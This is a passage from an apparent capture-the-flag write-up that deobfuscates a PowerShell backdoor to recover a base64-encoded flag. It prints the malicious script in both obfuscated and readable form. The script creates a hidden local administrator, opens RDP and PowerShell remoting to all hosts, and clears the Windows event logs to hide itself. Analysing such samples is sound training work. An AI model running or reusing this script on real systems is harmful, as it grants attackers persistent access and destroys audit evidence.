Zjq{usrsbEr} =  &  ( nNd{2'+'}{3}{0}{1}nNd -f(9pm-9pm+9pmLo9pm)'+',('+'(nNd{1}{0}nNd -f 9pmS9pm,9pmCAlU9p'+'m)+9pme9pm+9pmr9pm),9pmNe9pm,9pm'+'W9pm  ) -FullName ( 9pmGu9pm+  (9pmes9pm+9pmt9pm)+(9pm009pm+9pm19pm) ) -Name ((9pmG9pm+9pmue9pm)+  (9pms9pm+9pmt009pm) +9pm19pm ) -AccountNe'+'verExpires:Zjq{TrrsbUe}'+' -'+'Password (&  '+'( '+'nNd{0}{1}{3}{2}{4}nNd -f9pmC9pm,((nNd{0}{1}nNd-f9pmoN9pm,9pmVE9pm)+9pmRT9pm),(9pmSec9pm+9p'+'mUr9pm),(9pmt9pm+9pmO-9pm),((nNd{1}{0}nNd-f9pmSTR9pm'+',9pmE9pm)+9pmiNg9pm) ) -AsPlainText '+'-Force (  9pmV9pm + (9pmHJv9pm+(n'+'Nd{1}{0}nNd -f 9pm3N9pm,9'+'pmamFue9pm)+9pmsb'+'9pm+9pml9pm) + (9pm80b9pm+9pm'+'m9pm) + (9pmRf9pm+9pmc9pm) + ((nNd{0}{1}nNd-f9pmD9pm,9pmB3M39pm)+(nNd{1'+'}{0}nNd '+'-f9pmN9pm,9pmI1aD9pm)+9'+'p'+'msbD9pm+(nNd{0}{1}nNd-f'+' 9'+'pmU3M9pm,9pm2c9pm)) + ((nN'+'d{1}{2}{0}nNd -f9pmV2g0N189pm,9pmwL9pm,9pmi4u9pm)+9pm0X29pm+9pm4x9pm+9pmYzN9pm) + 9pmfd9pm + 9pmzR9pm + (9pm5'+'9'+'pm+'+'9pmX9pm+(nNd{0}{3}{1}{2}nNd-f9pm'+'zc'+'wX9pm,9pmk9pm,9pmMDByX9pm,9pm2I0Y2t9pm)+9pm3k9pm+9pmw'+'9pm+9pmd9pm) + 9pmX09pm + 9pm=9pm  ) ) -Description (  (9pmL9pm+9pmoca9pm)  +  9pml 9pm  +(9pmA9pm+9pmdm9pm) +((nNd{1}{0}nNd -f 9pmist9pm,9pmin9pm)+9pmr'+'9pm+9pmat9pm) + 9pmor9pm  )
.(nNd{0'+'}{1}{3}{2}{4}nNd -f 9pmAd9pm,(9pm'+'d9pm+(nNd{1}{0}nN'+'d -f 9p'+'mloC9pm,9pm-9pm'+')),(9pmM9pm+9pmBe9pm),(9pmaL9pm+(nNd{0}{1}{2}nNd-f 9pmgroup9pm,9p'+'mm'+'9pm'+',9pme9pm)),9pmr9pm ) -Memb'+'er Zjq{UsrsbEr} -G'+'roup (  (9pmAdm9pm+9pmini9pm)  + (9pms9pm+9pmtra9pm) +  9pmto9p'+'m+ 9pmrs9pm  )
.(n'+'Nd{0}{4}{1'+'}{3}{2}nNd-f(9pma9'+'pm'+'+9pmDD-9'+'pm)'+',(9pmgR'+'9pm+9pmOUp9pm+9pmM9pm),9'+'pmr9pm,(9pmem9pm+9pmbe9pm),(9pmloC9pm+9pmal9pm) ) -Group ((9pmR'+'e'+'9pm+9pmmot9pm+9pme 9pm)+  9pmDe9pm '+' +  9pms9pm'+'+  (9pmk9pm+9pmtop9pm)+'+'9'+'pm 9pm +((nNd{1}{0}nNd -f 9pmer9pm,9pmUs9pm)+9pms'+'9pm) ) -Member Zjq{usrsber}
 &( nNd{1}{3}{2}{0}nNd -f 9pmlE9pm,(9pmn9pm+9pmE9pm+9pmw'+'-N9pm+(nNd{0}{1}nNd -f9p'+'me9pm,9pmTFIr9pm)),9pmrU9pm,((nNd{0}{1}nNd-'+'f 9pmE9pm,9pmWaL9pm)+9pm'+'L9pm)) -LocalPort '+'3389 -DisplayName ( (9pmAll9pm+9pmo9pm) +  9p'+'mw 9'+'pm+ (9pmRD9pm+9pmP9pm'+')  ) -Protoco'+'l (9pmTC9pm+9pmP9pm) -Direction (9pmi9pm+9pmnB9pm+9pmOuND9pm) -Action (9pmaL9pm+9pmlOW9'+'pm)
 &  (nNd{1}{0'+'}{2}nNd -f(9pmEar9pm+9pm-9pm),9pmcl9pm,(9pme9pm+9pmveN9pm+(nNd{1}{0'+'}nNd -f 9pmG9pm,9pmtLO9pm)) ) -LogName (9pmSeCurI9p'+'m+9pmT9'+'pm+9pmy9pm)
.(  nNd{2}{1}{0}nNd -f(9pm-e9pm+(nNd{1}{'+'2}{0}nNd -f 9pmO9pm,9pmvEnt9pm,9pmL9pm)+9pmG9pm),(9pmEa9pm+9pm'+'r9pm),9pmcl9pm) -LogName (9pmSY9pm+9pmSTEm9pm)
&( nNd{2}{3}{0}{1}nNd-f (9pmEvE9pm+(nNd{1}{0}nNd-f 9pmo9'+'pm,9pmNTL9pm)),9pmg9pm,(9pmc9pm+9pmLE9pm),(9pmaR9pm+9pm-9pm) ) -LogName (9p'+'ma9pm+9pmPPlI9pm+9pmcATiO9pm+9pmn9pm)
.(nNd{1}{2}{0}nNd -'+'f ((nNd{1}{0}nNd -f9pmN'+'t9pm,9pmeVe9pm)+9pmlo9pm+9pm'+'G9pm),(9pmc9pm+9pmleA9pm),9pmR-9pm ) -LogName (9pmw'+'9pm+9pmind9pm+9pmoWS9pm) (9pmpOW9pm+9pme9pm+9pmrSHeLl9pm)')  -rEPLacE 'rsb',[CHaR]96  -rEPLacE  ([CHaR]110+[CHaR]78+[CHaR]100),[CHaR]34-rEPLacE ([CHaR]90+[CHaR]106+[CHaR]113),[CHaR]36  -cRePlAce'9pm',[CHaR]39) )
```

This might seem like really random at first, but we notice two things:
1) It again tries to execute the obfuscated script via an obfuscated format of `IEX`
2) At the end it does some string replacements (this explains why it makes 0 sense at first glance)

Being lazy once again, let's change the `. ( $VERBoSePReFErENcE.TostriNg()[1,3]+'X'-jOIn'')` to `Write-Output` to get the deobfuscated form:  
```ps1
Write-Output( (('  &  ( nNd{0}{3}{2}{4}{1}nNd-f 9pmen9pm,9pmNG9pm,(9pm'+'rE9pm+9pmm9pm),(9pmaBl9pm+9pmE9pm+9pm-'+'P'+'S9pm),(9pmOT9pm+9pmi9pm)  ) -Force
  &  (nN'+'d{1}{0}nNd-f ((nNd'+'{0}{1}nNd -f 9pme9pm,9pmt-it9pm)+9p'+'mE9pm+9pmm9pm),9pms9pm) (9pmwSm9pm+9pma9pm+9pmn:LOcAL9pm+9pmHO9pm+9pmstXpg9pm+9pmcLieN'+'9pm+9pmTXp9pm+9pmgTRUSTed9pm+9pmh9'+'pm+9pmo9pm+9pmSTs9pm).rEp'+'lAce(([ChA'+'R]88+[ChAR]1'+'12+['+'ChAR]103),[StRIng][ChAR]92) -Val'+'ue (9pm*9pm)
Zjq{usrsbEr} =  &  ( nNd{2'+'}{3}{0}{1}nNd -f(9pm-9pm+9pmLo9pm)'+',('+'(nNd{1}{0}nNd -f 9pmS9pm,9pmCAlU9p'+'m)+9pme9pm+9pmr9pm),9pmNe9pm,9pm'+'W9pm  ) -FullName ( 9pmGu9pm+  (9pmes9pm+9pmt9pm)+(9pm009pm+9pm19pm) ) -Name ((9pmG9pm+9pmue9pm)+  (9pms9pm+9pmt009pm) +9pm19pm ) -AccountNe'+'verExpires:Zjq{TrrsbUe}'+' -'+'Password (&  '+'( '+'nNd{0}{1}{3}{2}{4}nNd -f9pmC9pm,((nNd{0}{1}nNd-f9pmoN9pm,9pmVE9pm)+9pmRT9pm),(9pmSec9pm+9p'+'mUr9pm),(9pmt9pm+9pmO-9pm),((nNd{1}{0}nNd-f9pmSTR9pm'+',9pmE9pm)+9pmiNg9pm) ) -AsPlainText '+'-Force (  9pmV9pm + (9pmHJv9pm+(n'+'Nd{1}{0}nNd -f 9pm3N9pm,9'+'pmamFue9pm)+9pmsb'+'9pm+9pml9pm) + (9pm80b9pm+9pm'+'m9pm) + (9pmRf9pm+9pmc9pm) + ((nNd{0}{1}nNd-f9pmD9pm,9pmB3M39pm)+(nNd{1'+'}{0}nNd '+'-f9pmN9pm,9pmI1aD9pm)+9'+'p'+'msbD9pm+(nNd{0}{1}nNd-f'+' 9'+'pmU3M9pm,9pm2c9pm)) + ((nN'+'d{1}{2}{0}nNd -f9pmV2g0N189pm,9pmwL9pm,9pmi4u9pm)+9pm0X29pm+9pm4x9pm+9pmYzN9pm) + 9pmfd9pm + 9pmzR9pm + (9pm5'+'9'+'pm+'+'9pmX9pm+(nNd{0}{3}{1}{2}nNd-f9pm'+'zc'+'wX9pm,9pmk9pm,9pmMDByX9pm,9pm2I0Y2t9pm)+9pm3k9pm+9pmw'+'9pm+9pmd9pm) + 9pmX09pm + 9pm=9pm  ) ) -Description (  (9pmL9pm+9pmoca9pm)  +  9pml 9pm  +(9pmA9pm+9pmdm9pm) +((nNd{1}{0}nNd -f 9pmist9pm,9pmin9pm)+9pmr'+'9pm+9pmat9pm) + 9pmor9pm  )
.(nNd{0'+'}{1}{3}{2}{4}nNd -f 9pmAd9pm,(9pm'+'d9pm+(nNd{1}{0}nN'+'d -f 9p'+'mloC9pm,9pm-9pm'+')),(9pmM9pm+9pmBe9pm),(9pmaL9pm+(nNd{0}{1}{2}nNd-f 9pmgroup9pm,9p'+'mm'+'9pm'+',9pme9pm)),9pmr9pm ) -Memb'+'er Zjq{UsrsbEr} -G'+'roup (  (9pmAdm9pm+9pmini9pm)  + (9pms9pm+9pmtra9pm) +  9pmto9p'+'m+ 9pmrs9pm  )
.(n'+'Nd{0}{4}{1'+'}{3}{2}nNd-f(9pma9'+'pm'+'+9pmDD-9'+'pm)'+',(9pmgR'+'9pm+9pmOUp9pm+9pmM9pm),9'+'pmr9pm,(9pmem9pm+9pmbe9pm),(9pmloC9pm+9pmal9pm) ) -Group ((9pmR'+'e'+'9pm+9pmmot9pm+9pme 9pm)+  9pmDe9pm '+' +  9pms9pm'+'+  (9pmk9pm+9pmtop9pm)+'+'9'+'pm 9pm +((nNd{1}{0}nNd -f 9pmer9pm,9pmUs9pm)+9pms'+'9pm) ) -Member Zjq{usrsber}
 &( nNd{1}{3}{2}{0}nNd -f 9pmlE9pm,(9pmn9pm+9pmE9pm+9pmw'+'-N9pm+(nNd{0}{1}nNd -f9p'+'me9pm,9pmTFIr9pm)),9pmrU9pm,((nNd{0}{1}nNd-'+'f 9pmE9pm,9pmWaL9pm)+9pm'+'L9pm)) -LocalPort '+'3389 -DisplayName ( (9pmAll9pm+9pmo9pm) +  9p'+'mw 9'+'pm+ (9pmRD9pm+9pmP9pm'+')  ) -Protoco'+'l (9pmTC9pm+9pmP9pm) -Direction (9pmi9pm+9pmnB9pm+9pmOuND9pm) -Action (9pmaL9pm+9pmlOW9'+'pm)
 &  (nNd{1}{0'+'}{2}nNd -f(9pmEar9pm+9pm-9pm),9pmcl9pm,(9pme9pm+9pmveN9pm+(nNd{1}{0'+'}nNd -f 9pmG9pm,9pmtLO9pm)) ) -LogName (9pmSeCurI9p'+'m+9pmT9'+'pm+9pmy9pm)
.(  nNd{2}{1}{0}nNd -f(9pm-e9pm+(nNd{1}{'+'2}{0}nNd -f 9pmO9pm,9pmvEnt9pm,9pmL9pm)+9pmG9pm),(9pmEa9pm+9pm'+'r9pm),9pmcl9pm) -LogName (9pmSY9pm+9pmSTEm9pm)
&( nNd{2}{3}{0}{1}nNd-f (9pmEvE9pm+(nNd{1}{0}nNd-f 9pmo9'+'pm,9pmNTL9pm)),9pmg9pm,(9pmc9pm+9pmLE9pm),(9pmaR9pm+9pm-9pm) ) -LogName (9p'+'ma9pm+9pmPPlI9pm+9pmcATiO9pm+9pmn9pm)
.(nNd{1}{2}{0}nNd -'+'f ((nNd{1}{0}nNd -f9pmN'+'t9pm,9pmeVe9pm)+9pmlo9pm+9pm'+'G9pm),(9pmc9pm+9pmleA9pm),9pmR-9pm ) -LogName (9pmw'+'9pm+9pmind9pm+9pmoWS9pm) (9pmpOW9pm+9pme9pm+9pmrSHeLl9pm)')  -rEPLacE 'rsb',[CHaR]96  -rEPLacE  ([CHaR]110+[CHaR]78+[CHaR]100),[CHaR]34-rEPLacE ([CHaR]90+[CHaR]106+[CHaR]113),[CHaR]36  -cRePlAce'9pm',[CHaR]39) )
```
Running this will yield the following:  
```ps1
  &  ( "{0}{3}{2}{4}{1}"-f 'en','NG',('rE'+'m'),('aBl'+'E'+'-PS'),('OT'+'i')  ) -Force
  &  ("{1}{0}"-f (("{0}{1}" -f 'e','t-it')+'E'+'m'),'s') ('wSm'+'a'+'n:LOcAL'+'HO'+'stXpg'+'cLieN'+'TXp'+'gTRUSTed'+'h'+'o'+'STs').rEplAce(([ChAR]88+[ChAR]112+[ChAR]103),[StRIng][ChAR]92) -Value ('*')
${us`Er} =  &  ( "{2}{3}{0}{1}" -f('-'+'Lo'),(("{1}{0}" -f 'S','CAlU')+'e'+'r'),'Ne','W'  ) -FullName ( 'Gu'+  ('es'+'t')+('00'+'1') ) -Name (('G'+'ue')+  ('s'+'t00') +'1' ) -AccountNeverExpires:${Tr`Ue} -Password (&  ( "{0}{1}{3}{2}{4}" -f'C',(("{0}{1}"-f'oN','VE')+'RT'),('Sec'+'Ur'),('t'+'O-'),(("{1}{0}"-f'STR','E')+'iNg') ) -AsPlainText -Force (  'V' + ('HJv'+("{1}{0}" -f '3N','amFue')+'sb'+'l') + ('80b'+'m') + ('Rf'+'c') + (("{0}{1}"-f'D','B3M3')+("{1}{0}" -f'N','I1aD')+'sbD'+("{0}{1}"-f 'U3M','2c')) + (("{1}{2}{0}" -f'V2g0N18','wL','i4u')+'0X2'+'4x'+'YzN') + 'fd' + 'zR' + ('5'+'X'+("{0}{3}{1}{2}"-f'zcwX','k','MDByX','2I0Y2t')+'3k'+'w'+'d') + 'X0' + '='  ) ) -Description (  ('L'+'oca')  +  'l '  +('A'+'dm') +(("{1}{0}" -f 'ist','in')+'r'+'at') + 'or'  )
.("{0}{1}{3}{2}{4}" -f 'Ad',('d'+("{1}{0}" -f 'loC','-')),('M'+'Be'),('aL'+("{0}{1}{2}"-f 'group','m','e')),'r' ) -Member ${Us`Er} -Group (  ('Adm'+'ini')  + ('s'+'tra') +  'to'+ 'rs'  )
.("{0}{4}{1}{3}{2}"-f('a'+'DD-'),('gR'+'OUp'+'M'),'r',('em'+'be'),('loC'+'al') ) -Group (('Re'+'mot'+'e ')+  'De'  +  's'+  ('k'+'top')+' ' +(("{1}{0}" -f 'er','Us')+'s') ) -Member ${us`er}
 &( "{1}{3}{2}{0}" -f 'lE',('n'+'E'+'w-N'+("{0}{1}" -f'e','TFIr')),'rU',(("{0}{1}"-f 'E','WaL')+'L')) -LocalPort 3389 -DisplayName ( ('All'+'o') +  'w '+ ('RD'+'P')  ) -Protocol ('TC'+'P') -Direction ('i'+'nB'+'OuND') -Action ('aL'+'lOW')
 &  ("{1}{0}{2}" -f('Ear'+'-'),'cl',('e'+'veN'+("{1}{0}" -f 'G','tLO')) ) -LogName ('SeCurI'+'T'+'y')
.(  "{2}{1}{0}" -f('-e'+("{1}{2}{0}" -f 'O','vEnt','L')+'G'),('Ea'+'r'),'cl') -LogName ('SY'+'STEm')
&( "{2}{3}{0}{1}"-f ('EvE'+("{1}{0}"-f 'o','NTL')),'g',('c'+'LE'),('aR'+'-') ) -LogName ('a'+'PPlI'+'cATiO'+'n')
.("{1}{2}{0}" -f (("{1}{0}" -f'Nt','eVe')+'lo'+'G'),('c'+'leA'),'R-' ) -LogName ('w'+'ind'+'oWS') ('pOW'+'e'+'rSHeLl')
```
A lot better! To deobfuscate further, we must just add a `Write-Output` in front of each line and also remove the `&` symbols that lead to executing code (and thus, reducts the amount of printed output we would get):  
```ps1
Write-Output( "{0}{3}{2}{4}{1}"-f 'en','NG',('rE'+'m'),('aBl'+'E'+'-PS'),('OT'+'i')  ) -Force
Write-Output("{1}{0}"-f (("{0}{1}" -f 'e','t-it')+'E'+'m'),'s') ('wSm'+'a'+'n:LOcAL'+'HO'+'stXpg'+'cLieN'+'TXp'+'gTRUSTed'+'h'+'o'+'STs').rEplAce(([ChAR]88+[ChAR]112+[ChAR]103),[StRIng][ChAR]92) -Value ('*')
Write-Output ( "{2}{3}{0}{1}" -f('-'+'Lo'),(("{1}{0}" -f 'S','CAlU')+'e'+'r'),'Ne','W'  ) -FullName ( 'Gu'+  ('es'+'t')+('00'+'1') ) -Name (('G'+'ue')+  ('s'+'t00') +'1' ) -AccountNeverExpires:${Tr`Ue} -Password ( "{0}{1}{3}{2}{4}" -f'C',(("{0}{1}"-f'oN','VE')+'RT'),('Sec'+'Ur'),('t'+'O-'),(("{1}{0}"-f'STR','E')+'iNg') ) -AsPlainText -Force (  'V' + ('HJv'+("{1}{0}" -f '3N','amFue')+'sb'+'l') + ('80b'+'m') + ('Rf'+'c') + (("{0}{1}"-f'D','B3M3')+("{1}{0}" -f'N','I1aD')+'sbD'+("{0}{1}"-f 'U3M','2c')) + (("{1}{2}{0}" -f'V2g0N18','wL','i4u')+'0X2'+'4x'+'YzN') + 'fd' + 'zR' + ('5'+'X'+("{0}{3}{1}{2}"-f'zcwX','k','MDByX','2I0Y2t')+'3k'+'w'+'d') + 'X0' + '='  ) -Description (  ('L'+'oca')  +  'l '  +('A'+'dm') +(("{1}{0}" -f 'ist','in')+'r'+'at') + 'or'  )
Write-Output ("{0}{1}{3}{2}{4}" -f 'Ad',('d'+("{1}{0}" -f 'loC','-')),('M'+'Be'),('aL'+("{0}{1}{2}"-f 'group','m','e')),'r' ) -Member ${Us`Er} -Group (  ('Adm'+'ini')  + ('s'+'tra') +  'to'+ 'rs'  )
Write-Output ("{0}{4}{1}{3}{2}"-f('a'+'DD-'),('gR'+'OUp'+'M'),'r',('em'+'be'),('loC'+'al') ) -Group (('Re'+'mot'+'e ')+  'De'  +  's'+  ('k'+'top')+' ' +(("{1}{0}" -f 'er','Us')+'s') ) -Member ${us`er}
Write-Output ( "{1}{3}{2}{0}" -f 'lE',('n'+'E'+'w-N'+("{0}{1}" -f'e','TFIr')),'rU',(("{0}{1}"-f 'E','WaL')+'L')) -LocalPort 3389 -DisplayName ( ('All'+'o') +  'w '+ ('RD'+'P')  ) -Protocol ('TC'+'P') -Direction ('i'+'nB'+'OuND') -Action ('aL'+'lOW')
Write-Output  ("{1}{0}{2}" -f('Ear'+'-'),'cl',('e'+'veN'+("{1}{0}" -f 'G','tLO')) ) -LogName ('SeCurI'+'T'+'y')
Write-Output .(  "{2}{1}{0}" -f('-e'+("{1}{2}{0}" -f 'O','vEnt','L')+'G'),('Ea'+'r'),'cl') -LogName ('SY'+'STEm')
Write-Output ( "{2}{3}{0}{1}"-f ('EvE'+("{1}{0}"-f 'o','NTL')),'g',('c'+'LE'),('aR'+'-') ) -LogName ('a'+'PPlI'+'cATiO'+'n')
Write-Output ("{1}{2}{0}" -f (("{1}{0}" -f'Nt','eVe')+'lo'+'G'),('c'+'leA'),'R-' ) -LogName ('w'+'ind'+'oWS') ('pOW'+'e'+'rSHeLl')
```
The output we will get is:  
```ps1
enaBlE-PSrEmOTiNG
-Force
set-itEm
wSman:LOcALHOst\cLieNT\TRUSTedhoSTs
-Value
*
NeW-LoCAlUSer
-FullName
Guest001
-Name
Guest001
-AccountNeverExpires:
True
-Password
CoNVERTtO-SecUrESTRiNg
-AsPlainText
-Force
VHJvamFue3Nsbl80bmRfcDB3M3I1aDNsbDU3M2cwLi4uV2g0N180X24xYzNfdzR5XzcwX2I0Y2tkMDByX3kwdX0=
-Description
Local Administrator
Add-loCaLgroupmeMBer
-Member
-Group
Administrators
aDD-loCalgROUpMember
-Group
Remote Desktop Users
-Member
nEw-NeTFIrEWaLLrUlE
-LocalPort
3389
-DisplayName
Allow RDP
-Protocol
TCP
-Direction
inBOuND
-Action
aLlOW
clEar-eveNtLOG
-LogName
SeCurITy
.
clEar-evEntLOG
-LogName
SYSTEm
cLEaR-EvENTLog
-LogName
aPPlIcATiOn
cleAR-eVeNtloG
-LogName
windoWS
pOWerSHeLl
```
This is obviously not the pretiest output since each command is splitted in a new line. If you take your time to reconstruct it properly you would get:  
```ps1
Enable-PSRemoting -Force
Set-Item wsman:localhost\client\trustedhosts -Value *
$user = New-LocalUser -AccountNeverExpires:$true -Password (ConvertTo-SecureString -AsPlainText -Force 'VHJvamFue3Nsbl80bmRfcDB3M3I1aDNsbDU3M2cwLi4uV2g0N180X24xYzNfdzR5XzcwX2I0Y2tkMDByX3kwdX0=') -Name "Guest001" -FullName "Guest001" -Description "Local Administrator"
Add-LocalGroupMember -Group "Administrators" -Member $user
Add-LocalGroupMember -Group "Remote Desktop Users" -Member $user
New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow
Clear-EventLog -LogName Security
Clear-EventLog -LogName System
Clear-EventLog -LogName Application
Clear-EventLog -LogName Windows PowerShell
```

This essentially adds a remote user in the administrator group, adds a firewall rule to allow inbound rdp traffic, and clears the powershell logs so these commands do not show up.  

There is no more deobfuscation at this point, nor anything else to look at. The only suspicious element that exists is the password of the remote user that was added: `VHJvamFue3Nsbl80bmRfcDB3M3I1aDNsbDU3M2cwLi4uV2g0N180X24xYzNfdzR5XzcwX2I0Y2tkMDByX3kwdX0`.  
This seems a lot like base64, so if we try and decode it, we will get our flag:  
```python
>>> from base64 import b64decode
>>> # If you get an error about padding, add a '=' symbol
>>> b64decode(b"VHJvamFue3Nsbl80bmRfcDB3M3I1aDNsbDU3M2cwLi4uV2g0N180X24xYzNfdzR5XzcwX2I0Y2tkMDByX3kwdX0=")
b'Trojan{sln_4nd_p0w3r5h3ll573g0...Wh47_4_n1c3_w4y_70_b4ckd00r_y0u}'
```